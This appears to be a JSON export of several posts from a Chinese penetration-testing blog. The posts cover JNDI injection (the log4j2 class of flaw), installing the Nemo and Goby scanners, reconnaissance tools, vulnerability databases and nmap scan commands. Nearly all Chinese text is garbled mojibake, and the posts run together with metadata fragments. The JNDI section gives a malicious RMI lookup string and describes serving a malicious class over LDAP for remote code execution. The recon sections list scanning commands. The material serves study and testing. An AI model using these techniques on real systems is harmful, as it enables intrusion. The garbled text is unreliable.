ç¨‹åºå‘˜å¼€å‘çš„æ—¶å€™ï¼Œéœ€è¦å¼€å‘èƒ½å¤Ÿè®¿é—®mysqlæ•°æ®åº“çš„åº”ç”¨ï¼Œäºæ˜¯å°†ä¸€ä¸ªå¯¹mysql JDBCé©±åŠ¨ç¨‹åºç±»çš„å¼•ç”¨è¿›è¡Œäº†ç¼–ç ï¼Œå¹¶é€šè¿‡ä½¿ç”¨é€‚å½“çš„JDBC URLè¿æ¥åˆ°æ•°æ®åº“ 12345678910111213141516Connection conn=null; try &#123; Class.forName(&quot;com.mysql.jdbc.Driver&quot;, true, Thread.currentThread().getContextClassLoader()); conn=DriverManager.getConnection(&quot;jdbc:mysql://MyDBServer?user=qingfeng&amp;password=mingyue&quot;); /* ä½¿ç”¨connå¹¶è¿›è¡ŒSQLæ“ä½œ */ ...... conn.close(); &#125;catch(Exception e) &#123; e.printStackTrace(); &#125; finally &#123; if(conn!=null) &#123; try &#123; conn.close(); &#125;catch(SQLException e) &#123;&#125; &#125; &lt;br&gt;&#125; ä½†ç”±äºæ•°æ®åº“æœåŠ¡å™¨åç§°ã€ç”¨æˆ·åã€å£ä»¤éœ€è¦æ”¹å˜çš„æ—¶å€™ï¼Œç”±æ­¤å¼•å‘JDBCçš„URLä¹Ÿéœ€è¦ä¿®æ”¹. æ•°æ®åº“å¯èƒ½ä¸ä½¿ç”¨mysqläº†ï¼Œå¼•å‘JDBCé©±åŠ¨ç¨‹åºåŒ…å’Œç±»åéœ€è¦ä¿®æ”¹ éšç€å¼€å‘çš„è¿›è¡Œï¼ŒåŸé…ç½®çš„è¿æ¥æ± å‚æ•°å¯èƒ½ä¹Ÿéœ€è¦è°ƒæ•´ã€‚ 1jdbc:mysql://MyDBServer?user=qingfeng&amp;password=mingyue&quot; è§£å†³æ–¹æ¡ˆ ç¨‹åºå‘˜å¼€å‘çš„æ—¶å€™ä¸éœ€è¦å…³å¿ƒå…·ä½“çš„æ•°æ®åº“åå°æ˜¯ä»€ä¹ˆï¼ŒJDBCé©±åŠ¨ç¨‹åºæ˜¯ä»€ä¹ˆï¼ŒJDBC URLæ ¼å¼æ˜¯ä»€ä¹ˆï¼Œè®¿é—®æ•°æ®åº“çš„ç”¨æˆ·åå’Œå£ä»¤æ˜¯ä»€ä¹ˆã€‚å³ç¨‹åºå‘˜ç¼–å†™çš„ç¨‹åºåº”è¯¥æ²¡æœ‰å¯¹JDBCé©±åŠ¨ç¨‹åºçš„å¼•ç”¨ï¼Œç”šè‡³æ²¡æœ‰æ•°æ®åº“æ± æˆ–è¿æ¥ç®¡ç†ã€‚åº”è¯¥æŠŠè¿™äº›é—®é¢˜äº¤ç»™J2EEå®¹å™¨æ¥é…ç½®å’Œç®¡ç†ã€‚ç¨‹åºå‘˜åªéœ€è¦å¯¹è¿™äº›é…ç½®å’Œç®¡ç†è¿›è¡Œå¼•ç”¨å³å¯ã€‚äºæ˜¯å°±æœ‰äº†JNDI JDNIæ˜¯å¦‚ä½•å®é™…åº”ç”¨çš„ éœ€è¦é…ç½®æ•°æ®æºï¼Œä¿®æ”¹é…ç½®æ–‡ä»¶çš„å†…å®¹ï¼Œä½¿ä¹‹èƒ½é€šè¿‡JDBCæ­£ç¡®è®¿é—®åˆ°mysqlæ•°æ®åº“ã€‚é…ç½®æ–‡ä»¶å®šä¹‰äº†æ•°æ®æºï¼Œå…¶å‚æ•°åŒ…æ‹¬JDBCçš„URLï¼Œé©±åŠ¨ç±»åï¼Œç”¨æˆ·å¯†ç ç­‰ 1234567891011121314 1 &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; 2 &lt;datasources&gt; 3 &lt;local-tx-datasource&gt; 4 &lt;jndi-name&gt;MySqlDS&lt;/jndi-name&gt; 5 &lt;connection-url&gt;jdbc:mysql://localhost:3306/lw&lt;/connection-url&gt; 6 &lt;driver-class&gt;com.mysql.jdbc.Driver&lt;/driver-class&gt; 7 &lt;user-name&gt;root&lt;/user-name&gt; 8 &lt;password&gt;rootpassword&lt;/password&gt; 9 &lt;exception-sorter-class-name&gt;org.jboss.resource.adapter.jdbc.vendor.MySQLExceptionSorter&lt;/exception-sorter-class-name&gt;10 &lt;metadata&gt;11 &lt;type-mapping&gt;mySQL&lt;/type-mapping&gt;12 &lt;/metadata&gt;13 &lt;/local-tx-datasource&gt;14 &lt;/datasources&gt; å¼€å‘çš„æ—¶å€™ï¼Œåœ¨ç¨‹åºä¸­å¼•ç”¨æ•°æ®æºã€‚ç¨‹åºä¸éœ€è¦å…³å¿ƒJDBCå…·ä½“å‚æ•°ã€‚ åœ¨ç³»ç»Ÿéƒ¨ç½²åï¼Œå¦‚æœæ•°æ®åº“çš„ç›¸å…³å‚æ•°æ›´æ”¹ï¼Œåªéœ€è¦é‡æ–°é…ç½®mysql-ds.xmlï¼Œä¿®æ”¹å…¶ä¸­çš„JDBCå‚æ•°ï¼Œåªè¦ä¿è¯æ•°æ®æºçš„åç§°ä¸å˜ï¼Œé‚£ä¹ˆç¨‹åºæºä»£ç å°±æ— éœ€ä¿®æ”¹ã€‚ JNDIé¿å…äº†ç¨‹åºä¸æ•°æ®åº“ä¹‹é—´çš„ç´§è€¦åˆï¼Œä½¿åº”ç”¨æ›´åŠ æ˜“äºé…ç½®ã€æ˜“äºéƒ¨ç½² JNDIçš„æ‰©å±• æ‰€æœ‰ä¸ç³»ç»Ÿå¤–éƒ¨çš„èµ„æºçš„å¼•ç”¨ï¼Œéƒ½å¯ä»¥é€šè¿‡JNDIå®šä¹‰å’Œå¼•ç”¨ã€‚ LDAP æ˜¯ä»€ä¹ˆLDAP è½»é‡çº§ç›®å½•è®¿é—®åè®®ã€‚ LDAPç›®å½•æœåŠ¡æ˜¯ç”±ç›®å½•æ•°æ®åº“å’Œä¸€å¥—è®¿é—®åè®®ç»„æˆçš„ç³»ç»Ÿ ç»è¿‡ç®€å•çš„é…ç½®å°±å¯ä»¥ä¸æœåŠ¡å™¨åšè®¤è¯äº¤äº’ ç›®å½•æœåŠ¡ ç‰¹æ®Šçš„æ•°æ®åº“ï¼Œä¿å­˜æè¿°æ€§ã€åŸºäºå±æ€§çš„è¯¦ç»†ä¿¡æ¯ï¼Œæ”¯æŒè¿‡æ»¤åŠŸèƒ½ åŠ¨æ€çš„ï¼Œçµæ´»çš„ï¼Œæ˜“æ‰©å±• ç›®å½•æ˜¯ä¸€ä¸ªä¸ºæŸ¥è¯¢ã€æµè§ˆå’Œæœç´¢è€Œä¼˜åŒ–çš„æ•°æ®åº“ï¼Œæˆæ ‘çŠ¶ç»“æ„ç»„ç»‡æ•°æ®ï¼Œç±»ä¼¼æ–‡ä»¶ç›®å½•ã€‚æœ‰å¾ˆå¥½çš„è¯»æ€§èƒ½ï¼Œç”¨æ¥æŸ¥è¯¢ã€‚ LDAPæ•°æ®åº“æœåŠ¡å™¨ è®¿é—®æŸäº›æœåŠ¡å™¨ï¼Œæƒ³è¦è·å–é‡Œé¢çš„æ•°æ®ï¼Œéœ€è¦ç”¨åˆ°LDAPåè®® ç»Ÿä¸€èº«ä»½è®¤è¯ä¸»è¦æ˜¯æ”¹å˜åŸæœ‰çš„è®¤è¯ç­–ç•¥ï¼Œä½¿éœ€è¦è®¤è¯çš„è½¯ä»¶éƒ½é€šè¿‡LDAPè¿›è¡Œè®¤è¯ï¼Œåœ¨ç»Ÿä¸€èº«ä»½è®¤è¯ä¹‹åï¼Œç”¨æˆ·çš„æ‰€æœ‰ä¿¡æ¯éƒ½å­˜å‚¨åœ¨AD Serverä¸­ã€‚ç»ˆç«¯ç”¨æˆ·åœ¨éœ€è¦ä½¿ç”¨å…¬å¸å†…éƒ¨æœåŠ¡çš„æ—¶å€™ï¼Œéƒ½éœ€è¦é€šè¿‡ADæœåŠ¡å™¨çš„è®¤è¯ã€‚ JNDIExploitç”¨äºJNDIæ³¨å…¥åˆ©ç”¨çš„å·¥å…·ã€‚ JNDIæ³¨å…¥ JNDIçš„åº”ç”¨åœºæ™¯ï¼šåŠ¨æ€åŠ è½½æ•°æ®åº“é…ç½®æ–‡ä»¶ï¼Œä»è€Œä¿æŒæ•°æ®åº“ä»£ç ä¸å˜åŠ¨ç­‰ï¼Œä»£ç å¦‚ä¸‹ï¼š 123String jndiName= ...;//æŒ‡å®šéœ€è¦æŸ¥æ‰¾nameåç§°Context context = new InitialContext();//åˆå§‹åŒ–é»˜è®¤ç¯å¢ƒDataSource ds = (DataSourse)context.lookup(jndiName);//æŸ¥æ‰¾è¯¥nameçš„æ•°æ® è¿™äº›å¯¹è±¡å¯ä»¥å­˜å‚¨åœ¨ä¸åŒçš„å‘½åæˆ–ç›®å½•æœåŠ¡ä¸­ï¼Œä¾‹å¦‚è¿œç¨‹æ–¹æ³•è°ƒç”¨ï¼ˆRMIï¼‰ï¼Œé€šç”¨å¯¹è±¡è¯·æ±‚ä»£ç†ä½“ç³»ç»“æ„ï¼ˆCORBAï¼‰ï¼Œè½»å‹ç›®å½•è®¿é—®åè®®ï¼ˆLDAPï¼‰æˆ–åŸŸåæœåŠ¡ï¼ˆDNSï¼‰ã€‚ æ¯”å¦‚RMIï¼š 12InitialContext var1 = new InitialContext();DataSource var2 = (DataSource)var1.lookup(&quot;rmi://127.0.0.1:1099/Exploit&quot;); JNDIæ³¨å…¥å°±æ˜¯å½“ä¸Šæ–‡ä»£ç ä¸­jndiNameè¿™ä¸ªå˜é‡å¯æ§æ—¶ï¼Œå¼•å‘çš„æ¼æ´ã€‚å®ƒå°†å¯¼è‡´è¿œç¨‹classæ–‡ä»¶åŠ è½½ï¼Œä»è€Œå¯¼è‡´è¿œç¨‹ä»£ç æ‰§è¡Œã€‚å³&quot;rmi://127.0.0.1:1099/Exploit&quot;è¿™ä¸ªæ­£å¸¸çš„æ•°æ®æŸ¥æ‰¾ï¼Œå˜æˆäº†åŠ è½½æŸæœ‰å®³æ–‡ä»¶ã€‚ å³ åˆ©ç”¨JNDIæ³¨å…¥éœ€è¦æ»¡è¶³2ä¸ªæ¡ä»¶ éœ€è¦æœåŠ¡ç«¯å­˜åœ¨ä¸€ä¸‹ä»£ç ï¼Œä½¿å¾—URLå¯æ§ 123String uri = &quot;rmi://127.0.0.1:1099/aa&quot;; Context ctx = new InitialContext(); ctx.lookup(uri); å­˜åœ¨æ¼æ´ç‰ˆæœ¬çš„javaç¯å¢ƒ JNDIæ³¨å…¥åŸç† JNDIæ³¨å…¥ç”±äºå…¶åŠ è½½åŠ¨æ€ç±»åŸç†æ˜¯JNDI Referenceè¿œç¨‹åŠ è½½Object Factoryç±»çš„ç‰¹æ€§ï¼ˆä½¿ç”¨çš„ä¸æ˜¯RMI Class Loadingï¼Œè€Œæ˜¯ URL Class Loader LDAP+JNDI ç»•è¿‡æ›´å¤šç‰ˆæœ¬é™åˆ¶ï¼Œå®ç°æ³¨å…¥LDAP åŸºäºTCP&#x2F;IPåè®® æœåŠ¡ç«¯å­˜å‚¨æ•°æ®ï¼Œå®¢æˆ·ç«¯ä¸æœåŠ¡ç«¯è¿æ¥è¿›è¡Œæ“ä½œ æ ‘å½¢å­˜å‚¨ POC ä»£ç ä¼šæ ¹æ®ä¼ å…¥åè®®å¤´çš„åŒºåˆ«å»è¿›å…¥å¯¹åº”çš„å¤„ç†å‡½æ•°ï¼Œåªéœ€è¦ä¿®æ”¹ä¼ å…¥å‚æ•°çš„è§£æå¤´ï¼Œå†å¯åŠ¨LDAPæœåŠ¡ï¼Œæ¶æ„classçš„webæœåŠ¡å³å¯ å‚è€ƒæ–‡ç« https://mp.weixin.qq.com/s/W7kajN3GKKlK-C41N4re4g https://www.freebuf.com/vuls/310414.html https://xz.aliyun.com/t/10659 https://www.cnblogs.com/study-everyday/p/6723313.html https://www.cnblogs.com/wilburxu/p/9174353.html https://xz.aliyun.com/t/6633","categories":[{"name":"æ¼æ´å¤ç°","slug":"æ¼æ´å¤ç°","permalink":"https://gryffinbit.top/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"}],"tags":[{"name":"log4j2","slug":"log4j2","permalink":"https://gryffinbit.top/tags/log4j2/"}],"author":"Gryffinbit"},{"title":"Nemo macOSå®‰è£…","slug":"Nemo-macOSå®‰è£…","date":"2022-09-01T11:14:33.000Z","updated":"2024-08-27T02:28:08.000Z","comments":true,"path":"2022/09/01/Nemo-macOSå®‰è£…/","permalink":"https://gryffinbit.top/2022/09/01/Nemo-macOS%E5%AE%89%E8%A3%85/","excerpt":"","text":"ç¯å¢ƒNemo ç‰ˆæœ¬ï¼šamd64 macOS ç‰ˆæœ¬ï¼šMac miniï¼ˆM1ï¼Œ2020ï¼‰ å®‰è£…é¡¹ç›®åœ°å€ï¼šhttps://github.com/hanc00l/nemo_go/ ä¸‹è½½å®‰è£…åŒ… amd64 è§£å‹åˆ°æŒ‡å®šæ–‡ä»¶å¤¹ 1cd nemo rabbitmqå®‰è£…é…ç½® 1234brew install rabbitmq# é…ç½®rabbitmqï¼šå¢åŠ rabbitmqç”¨æˆ·å’Œå¯†ç sudo rabbitmqctl add_user nemo root123sudo rabbitmqctl set_permissions -p &quot;/&quot; nemo &quot;.*&quot; &quot;.*&quot; &quot;.*&quot;","categories":[{"name":"æ¸—é€æµ‹è¯•","slug":"æ¸—é€æµ‹è¯•","permalink":"https://gryffinbit.top/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"name":"å·¥å…·","slug":"æ¸—é€æµ‹è¯•/å·¥å…·","permalink":"https://gryffinbit.top/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%B7%A5%E5%85%B7/"}],"tags":[{"name":"ä¿¡æ¯æ”¶é›†","slug":"ä¿¡æ¯æ”¶é›†","permalink":"https://gryffinbit.top/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"}],"author":"Gryffinbit"},{"title":"æ¸—é€æµ‹è¯•ä¿¡æ¯æ”¶é›†","slug":"æ¸—é€æµ‹è¯•ä¿¡æ¯æ”¶é›†","date":"2022-08-31T18:16:08.000Z","updated":"2024-11-12T07:00:06.000Z","comments":true,"path":"2022/09/01/æ¸—é€æµ‹è¯•ä¿¡æ¯æ”¶é›†/","permalink":"https://gryffinbit.top/2022/09/01/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/","excerpt":"","text":"ä¿¡æ¯æ”¶é›†å·¥å…·Nemo Nemoæ˜¯ç”¨æ¥è¿›è¡Œè‡ªåŠ¨åŒ–ä¿¡æ¯æ”¶é›†çš„ä¸€ä¸ªç®€å•å¹³å°ï¼Œé€šè¿‡é›†æˆå¸¸ç”¨çš„ä¿¡æ¯æ”¶é›†å·¥å…·å’ŒæŠ€æœ¯ï¼Œå®ç°å¯¹å†…ç½‘åŠäº’è”ç½‘èµ„äº§ä¿¡æ¯çš„è‡ªåŠ¨æ”¶é›†ã€‚ é›†æˆäº†IPèµ„äº§ã€åŸŸåèµ„äº§ã€æŒ‡çº¹ä¿¡æ¯ã€APIæ¥å£ ã€PocéªŒè¯ä¸ç›®å½•æ‰«æã€åˆ†å¸ƒå¼ä»»åŠ¡ã€‚è¿™ä¸€å¥—æ“ä½œè¿˜æ˜¯ç•Œé¢å¯è§†åŒ–çš„ã€‚ åœ°å€ï¼šhttps://github.com/hanc00l/nemo_go macOS å®‰è£…è§blogï¼šã€å¾…å®Œæˆã€‘ SiteScan ä¸“æ³¨ä¸€ç«™åŒ–è§£å†³æ¸—é€æµ‹è¯•çš„ä¿¡æ¯æ”¶é›†ä»»åŠ¡ï¼ŒåŠŸèƒ½åŒ…æ‹¬åŸŸåipå†å²è§£æã€nmapå¸¸è§ç«¯å£çˆ†ç ´ã€å­åŸŸåä¿¡æ¯æ”¶é›†ã€æ—ç«™ä¿¡æ¯æ”¶é›†ã€whoisä¿¡æ¯æ”¶é›†ã€ç½‘ç«™æ¶æ„åˆ†æã€cmsè§£æã€å¤‡æ¡ˆä¿¡æ¯æ”¶é›†ã€CDNä¿¡æ¯è§£æã€æ˜¯å¦å­˜åœ¨wafæ£€æµ‹ã€åå°å¯»æ‰¾ä»¥åŠç”Ÿæˆæ£€æµ‹ç»“æœhtmlæŠ¥å‘Šè¡¨ã€‚ åœ°å€ï¼šhttps://github.com/kracer127/SiteScan å·²çŸ¥IPåœ°å€æŸ¥å¯¹åº”çš„åŸŸåï¼ˆIPåæŸ¥åŸŸåï¼‰1nslookup ipåœ°å€ 1host 123.125.66.120 ç½‘ç«™å·¥å…·ï¼š http://ip.yqie.com/iptodomain.aspx http://www.webscan.cc/ å·²çŸ¥åŸŸåæŸ¥å¯¹åº”IPï¼ˆåŸŸååæŸ¥IPï¼‰ pingå¯¹åº”çš„åŸŸå IP WHOISæŸ¥è¯¢ ç½‘ç«™å·¥å…·ï¼šhttps://tool.chinaz.com/ipwhois èµ„äº§è¯†åˆ«å‚è€ƒèµ„æ–™https://www.freebuf.com/articles/network/179519.html https://www.freebuf.com/articles/network/179519.html","categories":[{"name":"æ¸—é€æµ‹è¯•","slug":"æ¸—é€æµ‹è¯•","permalink":"https://gryffinbit.top/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"name":"ä¿¡æ¯æ”¶é›†","slug":"æ¸—é€æµ‹è¯•/ä¿¡æ¯æ”¶é›†","permalink":"https://gryffinbit.top/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"}],"tags":[{"name":"ä¿¡æ¯æ”¶é›†","slug":"ä¿¡æ¯æ”¶é›†","permalink":"https://gryffinbit.top/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"}],"author":"Gryffinbit"},{"title":"Gobyæ‰«æå™¨ç”¨æ³•","slug":"Gobyæ‰«æå™¨ç”¨æ³•","date":"2022-08-29T17:07:05.000Z","updated":"2024-11-12T06:59:42.000Z","comments":true,"path":"2022/08/30/Gobyæ‰«æå™¨ç”¨æ³•/","permalink":"https://gryffinbit.top/2022/08/30/Goby%E6%89%AB%E6%8F%8F%E5%99%A8%E7%94%A8%E6%B3%95/","excerpt":"","text":"ä»‹ç»Gobyç›®å‰æ˜¯ä½¿ç”¨Goè¯­è¨€å¼€å‘ã€é‡‡ç”¨Electron+VUEå‰ç«¯æ¡†æ¶çš„ç»¿è‰²ç‰ˆæœ¬ï¼Œæ”¯æŒwindows&#x2F;MacOS&#x2F;Linux ç¯å¢ƒmacOS: macOS Monterey. M1, 2020, ARM64 ä¸‹è½½åœ°å€https://gobysec.net/#dl é…ç½®è®¾ç½®ç½‘å¡æƒé™ 12cd /devsudo chown $USER:admin bp* # $USER éœ€è¦æ”¹ä¸ºç”µè„‘ç”¨æˆ·å åŠŸèƒ½ èµ„äº§æ”¶é›† è‡ªåŠ¨æ£€æµ‹å½“å‰ç½‘ç»œç©ºé—´å­˜æ´»çš„IPåŠè§£æåŸŸååˆ°IPï¼Œå¹¶ä¸”å¯ä»¥åˆ†æå‡ºç«¯å£å¯¹åº”çš„åè®®ã€Macåœ°å€ã€è¯ä¹¦ã€åº”ç”¨äº§å“ã€å‚å•†ç­‰ã€‚ å­åŸŸåæ‰«æ è‡ªåŠ¨çˆ¬å–å­åŸŸåï¼ŒAXFRç›‘æµ‹ï¼ŒäºŒçº§åŸŸåå­—å…¸çˆ†ç ´ï¼Œå…³è”åŸŸåæŸ¥è¯¢ã€‚åŒæ—¶æ”¯æŒè¿æ¥FOFAï¼Œæ‰©å¤§æ•°æ®æºã€‚ ç½‘ç«™æˆªå›¾ é€šè¿‡æˆªå›¾ï¼Œå¿«é€Ÿåˆ¤æ–­ç½‘ç«™ç³»ç»Ÿåº”ç”¨ï¼Œæ— é¡»å†ä¸€ä¸€æ‰“å¼€ã€‚ æ³¨ï¼šè¯¥åŠŸèƒ½åŸºäºChromeæˆªå›¾æ’ä»¶å®ç°ï¼Œéœ€è¦é¢„å®‰è£…Chromeæµè§ˆå™¨ã€‚ æ·±åº¦åˆ†æ å‘ç°éæ ‡å‡†ç«¯å£æˆ–éæ ‡å‡†åº”ç”¨ç³»ç»Ÿèµ„äº§ï¼Œè¿›è¡Œæ·±å…¥çš„åº”ç”¨è¯†åˆ«ã€‚åœ¨å®æˆ˜åœºæ™¯ä¸­éå¸¸æœ‰æ•ˆã€‚ ä»£ç†æ‰«æ é€šè¿‡socket5ä»£ç†ï¼Œå¿«é€Ÿè¿›å…¥å†…ç½‘ï¼Œå¼€å¯å†…ç½‘æ¸—é€ã€‚ æ³¨ï¼šæ”¯æŒPcapåŠsocketä¸¤ç§æ¨¡å¼ï¼Œè¯·æ ¹æ®ä¸åŒçš„åœºåˆåŠ¨æ€åˆ‡æ¢ã€‚ pcapæ¨¡å¼ï¼šæ”¯æŒåè®®è¯†åˆ«å’Œæ¼æ´æ‰«æï¼Œä¸æ”¯æŒç«¯å£æ‰«æï¼› socketæ¨¡å¼ï¼šæ”¯æŒç«¯å£æ‰«æåè®®è¯†åˆ«ä»¥åŠæ¼æ´æ‰«æï¼Œæ‰«æé€Ÿåº¦æ…¢ã€‚ æ¼æ´åˆ©ç”¨ å¯¹æ‰«æå‡ºæ¥çš„é£é™©èµ„äº§è¿›è¡Œæ‰¹é‡éªŒè¯ï¼ŒéªŒè¯æˆåŠŸåï¼Œå¯è¿›è¡Œåˆ©ç”¨ï¼Œåˆ©ç”¨æˆåŠŸåï¼Œä¸éœ€è¦è‡ªå·±æ­å»ºæœåŠ¡å™¨ï¼Œç›´æ¥è¿›è¡Œshellç®¡ç†ã€‚ æ”¯æŒè‡ªå®šä¹‰PoCåŠå¼±å£ä»¤å­—å…¸ï¼Œè®©å®‰å…¨äººå‘˜è‡ªå®šä¹‰å±äºè‡ªå·±çš„æ­¦å™¨åº“ï¼Œå¢å¼ºæ”»å‡»åŠ›ã€‚ ç”ŸæˆæŠ¥å‘Šæ‰«æå®Œæˆåï¼Œç”Ÿæˆåˆ†ææŠ¥å‘Šï¼Œå¹¶æ”¯æŒPDFã€Excelå¯¼å‡ºï¼Œæ–¹ä¾¿æœ¬åœ°åˆ†æåŠå‘ˆæŠ¥ä¼ é˜…ã€‚ CSæ¨¡å¼è¿œç¨‹æœåŠ¡ï¼ŒåŒºåˆ†æ‰«ææ¨¡å—åŠå±•ç¤ºæ¨¡å—ã€‚ CSæ­å»ºï¼šå¼€å¯è¿œç«¯æœåŠ¡ï¼Œç„¶åé…ç½®æœåŠ¡ç«¯ä¸»æœºã€ç«¯å£ã€è´¦æˆ·ä¿¡æ¯ã€‚ å‚è€ƒæ–‡ç« https://www.freebuf.com/sectool/232007.html","categories":[{"name":"æ¸—é€æµ‹è¯•","slug":"æ¸—é€æµ‹è¯•","permalink":"https://gryffinbit.top/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"name":"ä¿¡æ¯æ”¶é›†","slug":"æ¸—é€æµ‹è¯•/ä¿¡æ¯æ”¶é›†","permalink":"https://gryffinbit.top/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"}],"tags":[{"name":"Goby","slug":"Goby","permalink":"https://gryffinbit.top/tags/Goby/"}],"author":"Gryffinbit"},{"title":"å†å²æ¼æ´æŸ¥è¯¢","slug":"å†å²æ¼æ´æŸ¥è¯¢","date":"2022-08-29T16:33:19.000Z","updated":"2024-08-27T02:28:09.000Z","comments":true,"path":"2022/08/30/å†å²æ¼æ´æŸ¥è¯¢/","permalink":"https://gryffinbit.top/2022/08/30/%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E6%9F%A5%E8%AF%A2/","excerpt":"","text":"æ¼æ´åº“ ç¾å›½è‘—åå®‰å…¨å…¬å¸Offensive Securityçš„æ¼æ´åº“https://www.exploit-db.com/ é˜¿é‡Œäº‘æ¼æ´åº“ https://avd.aliyun.com/nvd/list tenableæ¼æ´åº“(nessus) https://www.tenable.com/cve/search CNNVDï¼ˆå›½å®¶ä¿¡æ¯å®‰å…¨æ¼æ´åº“ï¼‰ï¼šhttp://www.cnnvd.org.cn/ CNVDï¼ˆå›½å®¶ä¿¡æ¯å®‰å…¨æ¼æ´å…±äº«å¹³å°ï¼‰ï¼šhttps://www.cnvd.org.cn/ ç»¿ç›Ÿæ¼æ´åº“ï¼šhttp://www.nsfocus.net/index.php?act=sec_bug 0dayæ¼æ´åº“ï¼šhttp://0day5.com/. (2017å¹´åä¸å†æ›´æ–°äº†) ç¾å›½å›½å®¶å·¥æ§ç³»ç»Ÿè¡Œä¸šæ¼æ´åº“ï¼šhttps://ics-cert.us-cert.gov/advisories ä¸­å›½å›½å®¶å·¥æ§ç³»ç»Ÿè¡Œä¸šæ¼æ´ï¼šhttp://ics.cnvd.org.cn/ ç¾å›½å›½å®¶ä¿¡æ¯å®‰å…¨æ¼æ´åº“ ï¼šhttps://nvd.nist.gov/ CVE(ç¾å›½å›½åœŸå®‰å…¨èµ„åŠ©çš„MITREå…¬å¸è´Ÿè´£ç»´æŠ¤) ï¼šhttps://cve.mitre.org/cve/search_cve_list.html æ¸—é€æµ‹è¯•å…¶ä»–å·¥å…· çœ‹äº‘å…¨å¥—æ¸—é€æµç¨‹ï¼šhttps://www.kancloud.cn/wepeng/stcs/400558 ä¸€ä¸ªå¯¼èˆªï¼Œä¸œè¥¿å¾ˆå…¨é¢ ï¼šhttps://i.zkaq.cn/ çŸ¥é“åˆ›å®‡æŠ€èƒ½è¡¨ï¼šhttps://blog.knownsec.com/Knownsec_RD_Checklist/index.html æ¼æ´å¤ç°https://www.horizon3.ai/category/blog/red-team/","categories":[{"name":"æ¸—é€æµ‹è¯•","slug":"æ¸—é€æµ‹è¯•","permalink":"https://gryffinbit.top/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"name":"ä¿¡æ¯æ”¶é›†","slug":"æ¸—é€æµ‹è¯•/ä¿¡æ¯æ”¶é›†","permalink":"https://gryffinbit.top/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"}],"tags":[],"author":"Gryffinbit"},{"title":"nmapå¸¸è§æ‰«ææ–¹æ³•å’Œå‚æ•°ï¼Œä»¥åŠå¸¸è§ç«¯å£ä¿¡æ¯","slug":"nmapå¸¸è§æ‰«ææ–¹æ³•å’Œå‚æ•°ï¼Œä»¥åŠå¸¸è§ç«¯å£ä¿¡æ¯","date":"2022-08-26T17:28:54.000Z","updated":"2024-11-12T06:59:25.000Z","comments":true,"path":"2022/08/27/nmapå¸¸è§æ‰«ææ–¹æ³•å’Œå‚æ•°ï¼Œä»¥åŠå¸¸è§ç«¯å£ä¿¡æ¯/","permalink":"https://gryffinbit.top/2022/08/27/nmap%E5%B8%B8%E8%A7%81%E6%89%AB%E6%8F%8F%E6%96%B9%E6%B3%95%E5%92%8C%E5%8F%82%E6%95%B0%EF%BC%8C%E4%BB%A5%E5%8F%8A%E5%B8%B8%E8%A7%81%E7%AB%AF%E5%8F%A3%E4%BF%A1%E6%81%AF/","excerpt":"","text":"Nmapä½¿ç”¨å‚æ•° å®˜æ–¹å‚è€ƒï¼šhttps://nmap.org/man/zh/man-port-scanning-techniques.html 123456789101112131415161718192021222324252627-sLï¼šåˆ—å‡ºéœ€è¦æ‰«æçš„ç›®æ ‡ï¼Œä¸æ£€æµ‹å­˜æ´»çŠ¶æ€-snï¼šåªpingæ‰«æï¼Œä¸åšç«¯å£æ‰«æï¼Œæ£€æŸ¥å­˜æ´»çŠ¶æ€-Pnï¼šè·³è¿‡ä¸»æœºå‘ç°ï¼Œè§†æ‰€æœ‰ä¸»æœºéƒ½åœ¨çº¿-sSï¼šTCPç«¯å£æ‰«æï¼ŒåŠè¿æ¥æ‰«æï¼Œåªå‘é€SYNæŠ¥æ–‡ï¼Œä¸æ˜“è¢«æ³¨æ„-sPï¼šPingæ‰«æ-sTï¼šTCPç«¯å£æ‰«æï¼Œå»ºç«‹tcpè¿æ¥-sUï¼šUDPç«¯å£æ‰«æ-PRï¼šARP Pingï¼Œå¯ä»¥æ‰¾åˆ°MACåœ°å€-pï¼šåªæ‰«ææŒ‡å®šç«¯å£-nï¼šä¸ç”¨åŸŸåè§£æã€‚æ¯”è¾ƒå¿«-sVï¼šå¼€å¯ç«¯å£æœåŠ¡çš„ç‰ˆæœ¬æ£€æµ‹-A: æ“ä½œç³»ç»Ÿä¿¡æ¯å’Œç«¯å£æœåŠ¡ç‰ˆæœ¬æ¢æµ‹-vï¼šè¯¦ç»†è¾“å‡ºæ‰«ææƒ…å†µ-Oï¼šæ“ä½œç³»ç»Ÿè¯†åˆ«-sF: æ¢æµ‹é˜²ç«å¢™çŠ¶æ€ å¸¸ç”¨æ–¹æ³• æ‰«æå¤šä¸ªæ–‡ä»¶ç©ºæ ¼åˆ†å¼€ 1nmap 192.168.0.100 192.168.0.105 æ‰«æä¸€ä¸ªèŒƒå›´å†…çš„ 1nmap 192.168.0.100-110 æ‰«æä¸€ä¸ªç½‘æ®µ 1nmap 192.168.0.0/24 æ‰«æä¸€ä¸ªåˆ—è¡¨ä¸­çš„æ‰€æœ‰ç›®æ ‡åœ°å€ 1nmap -iL targets.txt æ‰«æé™¤ä¸€ä¸ªç›®æ ‡å¤–æ‰€æœ‰åœ°å€ 1nmap 192.168.0.0/24 -exclude 192.168.109.105 æ‰«æé™¤ä¸€ä¸ªæ–‡ä»¶å¤–çš„æ‰€æœ‰åœ°å€ 1nmap 192.168.0.0/24 -excludefile targets.txt æ‰«æç‰¹å®šç«¯å£ï¼Œé€—å·åˆ†éš” 